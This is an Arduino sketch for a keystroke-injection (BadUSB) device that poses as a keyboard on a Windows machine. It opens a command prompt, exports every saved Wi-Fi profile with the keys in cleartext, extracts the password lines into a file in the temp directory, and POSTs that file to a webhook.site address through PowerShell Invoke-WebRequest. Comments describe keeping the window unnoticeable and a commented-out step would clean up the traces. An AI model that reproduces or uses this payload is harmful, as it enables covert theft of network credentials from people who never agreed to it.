#include <Keyboard.h>

void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
void setup() {
  pinMode(13, OUTPUT); //LED 
}

void loop() {
  Keyboard.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(1000);
  //smallest cmd window possible for trying to making it as less noticeable as possible
  //Keyboard.print("cmd /k mode con: cols=15 lines=1"); 
  Keyboard.print("cmd /k "); 
  typeKey(KEY_RETURN);  
  delay(300);
  //Jumping to temporary dir
  Keyboard.print("cd %temp%"); 
  typeKey(KEY_RETURN);
  delay(300);
  //grabbing all the saved wifi passwd and saving them in temporary dir
  Keyboard.print("netsh wlan export profile key=clear"); 
  typeKey(KEY_RETURN);
  delay(300);
  //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  Keyboard.print("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); 
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  typeKey(KEY_RETURN);
  delay(300);
  // Keyboard.print("del Wi-* /s /f /q"); //cleaning up all the mess
  // typeKey(KEY_RETURN);
  delay(300);
  //Keyboard.print("exit");
  typeKey(KEY_RETURN);
  delay(300);
  digitalWrite(13, HIGH); //turn on led when program finishes
  delay(90000);
  digitalWrite(13, LOW); 
  delay(5000);
}
